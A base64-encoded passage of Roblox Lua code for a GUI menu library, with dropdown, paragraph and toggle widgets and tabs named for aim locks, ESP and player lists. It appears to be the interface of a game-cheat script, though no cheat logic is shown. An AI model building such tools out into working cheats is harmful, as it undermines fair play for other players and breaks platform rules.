CAgICAgICAgICAgIGxvY2FsIHNocmlua1R3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldyhBbmltYXRpb25TZXR0aW5ncy5FeHBhbmREdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDEuMDMsIC0xMCwgMCwgNDUpfSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9nZ2xlVHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKHRvZ2dsZSwgVHdlZW5JbmZvLm5ldyhBbmltYXRpb25TZXR0aW5ncy5Ub2dnbGVSb3RhdGlvbkR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1JvdGF0aW9uID0gMTgwfSkKICAgICAgICAgICAgICAgICAgICAgICAgc2V0dGluZ3MubGlzdC5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgc2V0dGluZ3MubGlzdC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMCkgLS0gUmVzZXQgbGlzdCBzaXplCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIE1vdmUgc2libGluZ3MgYmFjayB1cAogICAgICAgICAgICAgICAgICAgICAgICBBZGp1c3RTaWJsaW5nUG9zaXRpb25zKGN1cnJlbnRQYWdlLCBEcm9wZG93biwgLSgjc2V0dGluZ3MuT3B0aW9ucyAqICg0MCArIDIpIC0gKHNldHRpbmdzLk9wdGlvbnNbMV0gYW5kIDIgb3IgMCkpLCBBbmltYXRpb25TZXR0aW5ncy5FeHBhbmREdXJhdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgc2hyaW5rVHdlZW46UGxheSgpCiAgICAgICAgICAgICAgICAgICAgICAgIHRvZ2dsZVR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgICAgICAgICBzaHJpbmtUd2Vlbi5Db21wbGV0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWJvdW5jZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgICAgIGxvY2FsIG9wdGlvbkNvdW50ID0gI3NldHRpbmdzLk9wdGlvbnMKICAgICAgICBsb2NhbCBsaXN0SGVpZ2h0ID0gb3B0aW9uQ291bnQgKiAoNDAgKyAyKSAtIChvcHRpb25Db3VudCA+IDAgYW5kIDIgb3IgMCkgLS0gNDAgcGVyIG9wdGlvbiArIDIgcGFkZGluZywgbWludXMgcGFkZGluZyBmb3IgbGFzdCBvcHRpb24KICAgICAgICBzZXR0aW5ncy5saXN0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCBsaXN0SGVpZ2h0KQogICAgICAgIHNldHRpbmdzLl9kcm9wZG93bkhlaWdodCA9IDQ1ICsgbGlzdEhlaWdodAogICAgZW5kCgogICAgZnVuY3Rpb24gRHJvcGRvd25TZXR0aW5nczpTZXRPcHRpb25zKG5ld09wdGlvbnMpCiAgICAgICAgLS0gRW5zdXJlIG5ld09wdGlvbnMgaXMgYSB2YWxpZCB0YWJsZQogICAgICAgIHNlbGYuT3B0aW9ucyA9ICh0eXBlKG5ld09wdGlvbnMpID09ICJ0YWJsZSIgYW5kIG5ld09wdGlvbnMpIG9yIHt9CiAgICAgICAgCiAgICAgICAgLS0gQ2xlYXIgZXhpc3Rpbmcgb3B0aW9ucwogICAgICAgIGZvciBfLCBvcHRpb24gaW4gaXBhaXJzKHNlbGYubGlzdDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBvcHRpb24uQ2xhc3NOYW1lID09ICJUZXh0QnV0dG9uIiB0aGVuCiAgICAgICAgICAgICAgICBvcHRpb246RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIENhbGwgU2V0RHJvcGRvd25PcHRpb25zIHRvIHJlYnVpbGQgdGhlIG9wdGlvbnMKICAgICAgICBTZXREcm9wZG93bk9wdGlvbnMoc2VsZikKICAgICAgICAKICAgICAgICAtLSBBZGp1c3Qgc2libGluZyBwb3NpdGlvbnMgYWZ0ZXIgdXBkYXRpbmcgb3B0aW9ucwogICAgICAgIGlmIHNlbGYubGlzdC5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgbG9jYWwgb3B0aW9uQ291bnQgPSAjc2VsZi5PcHRpb25zCiAgICAgICAgICAgIGxvY2FsIGxpc3RIZWlnaHQgPSBvcHRpb25Db3VudCAqICg0MCArIDIpIC0gKG9wdGlvbkNvdW50ID4gMCBhbmQgMiBvciAwKQogICAgICAgICAgICBBZGp1c3RTaWJsaW5nUG9zaXRpb25zKGN1cnJlbnRQYWdlLCBEcm9wZG93biwgbGlzdEhlaWdodCwgQW5pbWF0aW9uU2V0dGluZ3MuRXhwYW5kRHVyYXRpb24pCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmdW5jdGlvbiBEcm9wZG93blNldHRpbmdzOlJlZnJlc2gob3B0aW9uc1RhYmxlKQogICAgICAgIHNlbGYuT3B0aW9ucyA9ICh0eXBlKG9wdGlvbnNUYWJsZSkgPT0gInRhYmxlIiBhbmQgb3B0aW9uc1RhYmxlKSBvciB7fQogICAgICAgIGZvciBfLCBvcHRpb24gaW4gaXBhaXJzKHNlbGYubGlzdDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBvcHRpb24uQ2xhc3NOYW1lID09ICJUZXh0QnV0dG9uIiB0aGVuCiAgICAgICAgICAgICAgICBvcHRpb246RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIFNldERyb3Bkb3duT3B0aW9ucyhzZWxmKQogICAgICAgIAogICAgICAgIC0tIEFkanVzdCBzaWJsaW5nIHBvc2l0aW9ucyBhZnRlciByZWZyZXNoaW5nIG9wdGlvbnMKICAgICAgICBpZiBzZWxmLmxpc3QuVmlzaWJsZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIG9wdGlvbkNvdW50ID0gI3NlbGYuT3B0aW9ucwogICAgICAgICAgICBsb2NhbCBsaXN0SGVpZ2h0ID0gb3B0aW9uQ291bnQgKiAoNDAgKyAyKSAtIChvcHRpb25Db3VudCA+IDAgYW5kIDIgb3IgMCkKICAgICAgICAgICAgQWRqdXN0U2libGluZ1Bvc2l0aW9ucyhjdXJyZW50UGFnZSwgRHJvcGRvd24sIGxpc3RIZWlnaHQsIEFuaW1hdGlvblNldHRpbmdzLkV4cGFuZER1cmF0aW9uKQogICAgICAgIGVuZAogICAgZW5kCgogICAgZnVuY3Rpb24gRHJvcGRvd25TZXR0aW5nczpTZXQoTmV3T3B0aW9uKQogICAgICAgIGlmIHR5cGVvZihOZXdPcHRpb24pID09ICJzdHJpbmciIHRoZW4KICAgICAgICAgICAgTmV3T3B0aW9uID0ge05ld09wdGlvbn0KICAgICAgICBlbmQKCiAgICAgICAgc2VsZi5DdXJyZW50T3B0aW9uID0gTmV3T3B0aW9uCiAgICAgICAgaWYgbm90IHNlbGYuTXVsdGlwbGVPcHRpb25zIGFuZCAjc2VsZi5DdXJyZW50T3B0aW9uID4gMSB0aGVuCiAgICAgICAgICAgIHNlbGYuQ3VycmVudE9wdGlvbiA9IHtzZWxmLkN1cnJlbnRPcHRpb25bMV19CiAgICAgICAgZW5kCgogICAgICAgIHNlbGVjdGVkLlRleHQgPSBzZWxmLk11bHRpcGxlT3B0aW9ucyBhbmQgKCNzZWxmLkN1cnJlbnRPcHRpb24gPiAxIGFuZCAiVmFyaW91cyIgb3Igc2VsZi5DdXJyZW50T3B0aW9uWzFdIG9yICJOb25lIikgb3Igc2VsZi5DdXJyZW50T3B0aW9uWzFdIG9yICJOb25lIgogICAgICAgIGZvciBfLCBvcHRpb24gaW4gaXBhaXJzKGxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgb3B0aW9uLkNsYXNzTmFtZSA9PSAiVGV4dEJ1dHRvbiIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaXNTZWxlY3RlZCA9IHRhYmxlLmZpbmQoc2VsZi5DdXJyZW50T3B0aW9uLCBvcHRpb24uTmFtZSkKICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUob3B0aW9uLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLlNlbGVjdGlvblRyYW5zaXRpb25EdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5TaW5lLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IGlzU2VsZWN0ZWQgYW5kIENvbG9yMy5mcm9tUkdCKDEwMCwgMTAwLCAxMDApIG9yIENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLAogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBpc1NlbGVjdGVkIGFuZCAwLjcgb3IgMQogICAgICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBpZiB0eXBlb2Yoc2VsZi5DYWxsYmFjaykgPT0gImZ1bmN0aW9uIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHNlbGYuQ2FsbGJhY2soc2VsZi5DdXJyZW50T3B0aW9uKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgIHdhcm4oIkNhbGxiYWNrIGVycm9yIGZvciAiIC4uIHNlbGYuTmFtZSAuLiAiOiAiIC4uIHRvc3RyaW5nKGVycikpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgLS0gSW5pdGlhbGl6ZSBkcm9wZG93biBvcHRpb25zCiAgICBTZXREcm9wZG93bk9wdGlvbnMoRHJvcGRvd25TZXR0aW5ncykKCiAgICByZXR1cm4gRHJvcGRvd25TZXR0aW5ncwplbmQsCi0tW1sKICAgICAgICBDcmVhdGVQYXJhZ3JhcGggPSBmdW5jdGlvbihfLCBvcHRpb25zKQogICAgICAgICAgICBsb2NhbCBjdXJyZW50UGFnZSA9IHRhYlBhZ2VzW3RhYk5hbWVdCiAgICAgICAgICAgIGlmIG5vdCBjdXJyZW50UGFnZSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgIGxvY2FsIHBhcmFncmFwaEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgICAgIHBhcmFncmFwaEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMS4wMywgLTIwLCAwLCAxMjApCiAgICAgICAgICAgIHBhcmFncmFwaEZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIHBhcmFncmFwaEZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAxMCkKICAgICAgICAgICAgcGFyYWdyYXBoRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM1LCAzNSwgMzUpCiAgICAgICAgICAgIHBhcmFncmFwaEZyYW1lLkJvcmRlckNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgIHBhcmFncmFwaEZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDIKICAgICAgICAgICAgcGFyYWdyYXBoRnJhbWUuWkluZGV4ID0gMgogICAgICAgICAgICBwYXJhZ3JhcGhGcmFtZS5QYXJlbnQgPSBjdXJyZW50UGFnZQoKICAgICAgICAgICAgbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgICAgIGNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAyKQogICAgICAgICAgICBjb3JuZXIuUGFyZW50ID0gcGFyYWdyYXBoRnJhbWUKCiAgICAgICAgICAgIGxvY2FsIHBhcmFncmFwaFRleHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIHBhcmFncmFwaFRleHQuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMzAsIDEsIC0zMCkKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMjApCiAgICAgICAgICAgIHBhcmFncmFwaFRleHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5UZXh0ID0gb3B0aW9ucy5Db250ZW50IG9yICJOb3QgTG9hZGVkIENvcnJlY3RseSA6KCIKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5UZXh0U2l6ZSA9IDI0CiAgICAgICAgICAgIHBhcmFncmFwaFRleHQuVGV4dFdyYXBwZWQgPSB0cnVlCiAgICAgICAgICAgIHBhcmFncmFwaFRleHQuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5UZXh0WUFsaWdubWVudCA9IEVudW0uVGV4dFlBbGlnbm1lbnQuVG9wCiAgICAgICAgICAgIHBhcmFncmFwaFRleHQuVGV4dFpJbmRleCA9IDIKICAgICAgICAgICAgcGFyYWdyYXBoVGV4dC5QYXJlbnQgPSBwYXJhZ3JhcGhGcmFtZQogICAgICAgICAgICBpZiBvcHRpb25zLlRpdGxlIHRoZW4KCiAgICAgICAgICAgICAgICBsb2NhbCB0aXRsZUxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIC00MCwgMCwgMjApCiAgICAgICAgICAgICAgICB0aXRsZUxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAwKQogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5UZXh0ID0gb3B0aW9ucy5UaXRsZQogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIHRpdGxlTGFiZWwuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zU2VtaWJvbGQKICAgICAgICAgICAgICAgIHRpdGxlTGFiZWwuVGV4dFNpemUgPSAyMgogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgdGl0bGVMYWJlbC5UZXh0WUFsaWdubWVudCA9IEVudW0uVGV4dFlBbGlnbm1lbnQuVG9wCiAgICAgICAgICAgICAgICB0aXRsZUxhYmVsLlpJbmRleCA9IDIKICAgICAgICAgICAgICAgIHRpdGxlTGFiZWwuUGFyZW50ID0gcGFyYWdyYXBoRnJhbWUKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBjb3B5QnV0dG9uID0gY3JlYXRlSWNvbkJ1dHRvbigiY29weSIsIHBhcmFncmFwaEZyYW1lKQogICAgICAgICAgICBpZiBjb3B5QnV0dG9uIHRoZW4KICAgICAgICAgICAgICAgIGNvcHlCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTI1LCAwLCA1KQogICAgICAgICAgICAgICAgY29weUJ1dHRvbi5aSW5kZXggPSAzCiAgICAgICAgICAgICAgICBjb3B5QnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIHBhcmFncmFwaFRleHQgYW5kIHBhcmFncmFwaFRleHQ6SXNBKCJUZXh0TGFiZWwiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHNldGNsaXBib2FyZChwYXJhZ3JhcGhUZXh0LlRleHQpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJQYXJhZ3JhcGggdGV4dCBsYWJlbCBub3QgZm91bmQgb3IgaW52YWxpZCIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXR1cm4gcGFyYWdyYXBoRnJhbWUKICAgICAgICBlbmQsCl1dCkNyZWF0ZVRvZ2dsZSA9IGZ1bmN0aW9uKF8sIG9wdGlvbnMpCiAgICBsb2NhbCBjdXJyZW50UGFnZSA9IHRhYlBhZ2VzW3RhYk5hbWVdCiAgICBpZiBub3QgY3VycmVudFBhZ2UgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgdG9nZ2xlRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIHRvZ2dsZUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMS4wMywgMCwgMCwgNDApCiAgICB0b2dnbGVGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgdG9nZ2xlRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICB0b2dnbGVGcmFtZS5aSW5kZXggPSAyCiAgICB0b2dnbGVGcmFtZS5QYXJlbnQgPSBjdXJyZW50UGFnZQoKICAgIGxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgY29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCiAgICBjb3JuZXIuUGFyZW50ID0gdG9nZ2xlRnJhbWUKCiAgICBsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIGxhYmVsLlNpemUgPSBVRGltMi5uZXcoMSwgLTcwLCAwLCA0MCkKICAgIGxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAwKQogICAgbGFiZWwuVGV4dCA9IG9wdGlvbnMuTmFtZSBvciAiVG9nZ2xlIiAgLS0gSW5pdGlhbCB0ZXh0IG9mIHRoZSB0b2dnbGUKICAgIGxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgbGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBsYWJlbC5UZXh0U2l6ZSA9IDE4CiAgICBsYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgbGFiZWwuWkluZGV4ID0gMgogICAgbGFiZWwuUGFyZW50ID0gdG9nZ2xlRnJhbWUKCiAgICAtLSBGdW5jdGlvbiB0byB1cGRhdGUgdGhlIGxhYmVsJ3MgdGV4dCBkeW5hbWljYWxseQogICAgbG9jYWwgZnVuY3Rpb24gVXBkYXRlTGFiZWxUZXh0KG5ld1RleHQpCiAgICAgICAgbGFiZWwuVGV4dCA9IG5ld1RleHQgb3Igb3B0aW9ucy5OYW1lIG9yICJUb2dnbGUiCiAgICBlbmQKCiAgICBsb2NhbCBzd2l0Y2hDb250YWluZXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIHN3aXRjaENvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDAsIDQwLCAwLCAyMCkKICAgIHN3aXRjaENvbnRhaW5lci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtNTAsIDAsIDEwKQogICAgc3dpdGNoQ29udGFpbmVyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQogICAgc3dpdGNoQ29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjkKICAgIHN3aXRjaENvbnRhaW5lci5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBzd2l0Y2hDb250YWluZXIuWkluZGV4ID0gMgogICAgc3dpdGNoQ29udGFpbmVyLlBhcmVudCA9IHRvZ2dsZUZyYW1lCgogICAgbG9jYWwgc3dpdGNoU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICBzd2l0Y2hTdHJva2UuVGhpY2tuZXNzID0gMQogICAgc3dpdGNoU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIHN3aXRjaFN0cm9rZS5UcmFuc3BhcmVuY3kgPSAwLjIKICAgIHN3aXRjaFN0cm9rZS5BcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgIHN3aXRjaFN0cm9rZS5QYXJlbnQgPSBzd2l0Y2hDb250YWluZXIKCiAgICBsb2NhbCBjb3JuZXIyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBjb3JuZXIyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQogICAgY29ybmVyMi5QYXJlbnQgPSBzd2l0Y2hDb250YWluZXIKCiAgICBsb2NhbCBrbm9iID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBrbm9iLlNpemUgPSBVRGltMi5uZXcoMCwgMTYsIDAsIDE2KQogICAga25vYi5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAsIDAuNSkKICAgIGtub2IuUG9zaXRpb24gPSBvcHRpb25zLkN1cnJlbnRWYWx1ZSBhbmQgVURpbTIubmV3KDEsIC0xOCwgMC41LCAwKSBvciBVRGltMi5uZXcoMCwgMiwgMC40OSwgMCkKICAgIGtub2IuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBrbm9iLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIGtub2IuWkluZGV4ID0gMwogICAga25vYi5QYXJlbnQgPSBzd2l0Y2hDb250YWluZXIKCiAgICBsb2NhbCBrbm9iQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBrbm9iQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQogICAga25vYkNvcm5lci5QYXJlbnQgPSBrbm9iCgogICAgbG9jYWwgdG9nZ2xlQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIHRvZ2dsZUJ1dHRvbi5TaXplID0gdG9nZ2xlRnJhbWUuU2l6ZQogICAgdG9nZ2xlQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICB0b2dnbGVCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIHRvZ2dsZUJ1dHRvbi5UZXh0ID0gIiIKICAgIHRvZ2dsZUJ1dHRvbi5aSW5kZXggPSA0CiAgICB0b2dnbGVCdXR0b24uUGFyZW50ID0gdG9nZ2xlRnJhbWUKCiAgICBsb2NhbCBmdW5jdGlvbiB0b2dnbGVTd2l0Y2goKQogICAgICAgIG9wdGlvbnMuQ3VycmVudFZhbHVlID0gbm90IG9wdGlvbnMuQ3VycmVudFZhbHVlCiAgICAgICAgbG9jYWwgdGFyZ2V0UG9zaXRpb24gPSBvcHRpb25zLkN1cnJlbnRWYWx1ZSBhbmQgVURpbTIubmV3KDEsIC0xOCwgMC41LCAwKSBvciBVRGltMi5uZXcoMCwgMiwgMC40OSwgMCkKICAgICAgICBsb2NhbCB0b2dnbGVTb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgICAgIHRvZ2dsZVNvdW5kLk5hbWUgPSAiQ2xpY2tTb3VuZCIKICAgICAgICB0b2dnbGVTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8xNTY3NTA1OTMyMyIKICAgICAgICB0b2dnbGVTb3VuZC5Wb2x1bWUgPSAwLjIKICAgICAgICB0b2dnbGVTb3VuZC5QYXJlbnQgPSB0b2dnbGVGcmFtZQogICAgICAgIHRvZ2dsZVNvdW5kOlBsYXkoKQogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoa25vYiwgVHdlZW5JbmZvLm5ldygwLjE1LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHsKICAgICAgICAgICAgUG9zaXRpb24gPSB0YXJnZXRQb3NpdGlvbgogICAgICAgIH0pOlBsYXkoKQogICAgICAgIGlmIHR5cGVvZihvcHRpb25zLkNhbGxiYWNrKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgb3B0aW9ucy5DYWxsYmFjayhvcHRpb25zLkN1cnJlbnRWYWx1ZSkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHRvZ2dsZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KHRvZ2dsZVN3aXRjaCkKCiAgICB0YWJsZS5pbnNlcnQodG9nZ2xlcywge2ZyYW1lID0gdG9nZ2xlRnJhbWUsIG9wdGlvbnMgPSBvcHRpb25zfSkKCiAgICByZXR1cm4gdG9nZ2xlRnJhbWUsIFVwZGF0ZUxhYmVsVGV4dAplbmQKICAgIH0KZW5kCgpsb2NhbCBUYWIxID0gVGFiOk5ldygiSG9tZSIpCmxvY2FsIFRhYjIgPSBUYWI6TmV3KCJQbGF5ZXIiKQpsb2NhbCBUYWI3ID0gVGFiOk5ldygiVmMiKQpsb2NhbCBUYWIzID0gVGFiOk5ldygiR2FtZVRhYiIpCmxvY2FsIFRhYjQgPSBUYWI6TmV3KCJMb2Nrcy9BaW0iKQpsb2NhbCBUYWI1ID0gVGFiOk5ldygiRXNwJ3MiKQpsb2NhbCBUYWI2ID0gVGFiOk5ldygiTWlzYyIpCgpsb2NhbCBUYWJzID0gewogICAgVGFiMSA9IFRhYjEsCiAgICBUYWIyID0gVGFiMiwKICAgIFRhYjMgPSBUYWIzLAogICAgVGFiNCA9IFRhYjQsCiAgICBUYWI1ID0gVGFiNSwKICAgIFRhYjYgPSBUYWI2LAoJVGFiNyA9IFRhYjcKfQoKVGFiMTpDcmVhdGVMYWJlbCh7CiAgICBOYW1lID0gIkhvbWUiLAp9KQoKVGFiMTpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJUZXN0IEJ1dHRvbiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAKICAgIGVuZAp9KQoKVGFiMTpDcmVhdGVEcm9wZG93bih7CiAgICBOYW1lID0gIlRlc3QgRHJvcGRvd24iLAogICAgT3B0aW9ucyA9IHsiT3B0aW9uIDEiLCAiT3B0aW9uIDIiLCAiT3B0aW9uIDMifSwKICAgIEN1cnJlbnRPcHRpb24gPSB7Ik9wdGlvbiAxIn0sCiAgICBNdWx0aXBsZU9wdGlvbnMgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgcHJpbnQoIlNlbGVjdGVkIG9wdGlvbnM6IiwgdGFibGUuY29uY2F0KHNlbGVjdGVkLCAiLCAiKSkKICAgIGVuZAp9KQoKVGFiMTpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJUZXN0IFRvZ2dsZSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCgogICAgZW5kCn0pCgpUYWIyOkNyZWF0ZUxhYmVsKHsKICAgIE5hbWUgPSAiUGxheWVyIiwKfSkKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKCk5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgVGl0bGUgPSAiQWN0aW9uIFJlcXVpcmVkISIsCiAgICBDb250ZW50ID0gIkRvIHlvdSB3YW50IHRvIHByb2NlZWQgd2l0aCBsb2FkaW5nIHRoZSBwbGF5ZXIgbGlzdD8iLAogICAgQnV0dG9uMSA9IHRydWUsCiAgICBCdXR0b24xVGV4dCA9ICJZZXMiLAogICAgQnV0dG9uMUNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZvcm1hdFBsYXllcihwbGF5ZXIpCiAgICAgICAgICAgIHJldHVybiBwbGF5ZXIuRGlzcGxheU5hbWUgLi4gIlxu